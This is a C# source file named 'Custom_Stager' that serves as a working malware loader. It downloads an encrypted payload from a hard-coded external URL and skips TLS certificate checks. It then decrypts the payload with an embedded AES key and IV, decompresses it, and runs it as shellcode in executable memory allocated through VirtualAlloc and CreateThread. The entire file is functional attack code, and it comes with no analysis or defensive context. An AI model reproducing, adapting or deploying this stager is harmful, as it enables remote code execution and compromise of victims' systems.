using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Custom_Stager
{
    class Program
    {
        private static string url = "https://www.administrative.cc/d2fc1b6a458f.asx";
        private static string AESKey = "9ae0c8e048d89fb3";
        private static string AESIV = "789ca1a73299c6e0";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                using (MemoryStream decryptedStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(decryptedStream);
                    return decryptedStream.ToArray();
                }
            }
        }

        public static byte[] Decompress(byte[] input)
        {
            using (MemoryStream tmpMs = new MemoryStream())
            using (MemoryStream ms = new MemoryStream(input))
            using (GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true))
            {
                zip.CopyTo(tmpMs);
                return tmpMs.ToArray();
            }
        }

        public static byte[] Download(string url)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                WebClient client = new WebClient();
                return client.DownloadData(url);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error during download: " + ex.Message);
                return null;
            }
        }

        public static void Execute(byte[] code)
        {
            if (code.Length <= 16)
            {
                Console.WriteLine("The code length is insufficient.");
                return;
            }

            byte[] encrypted = code.Skip(16).ToArray();
            byte[] decrypted;
            try
            {
                decrypted = AESDecrypt(encrypted, AESKey, AESIV);
            }
            catch
            {
                Console.WriteLine("Error during decryption.");
                return;
            }

            byte[] decompressed;
            try
            {
                decompressed = Decompress(decrypted);
            }
            catch
            {
                Console.WriteLine("Error during decompression.");
                return;
            }

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Error during memory allocation.");
                return;
            }

            Marshal.Copy(decompressed, 0, addr, decompressed.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void Main(String[] args)
        {
            byte[] output = Download(url);
            if (output != null && output.Length > 0)
            {
                Execute(output);
            }
            else
            {
                Console.WriteLine("Error retrieving payload.");
            }
        }
    }
}

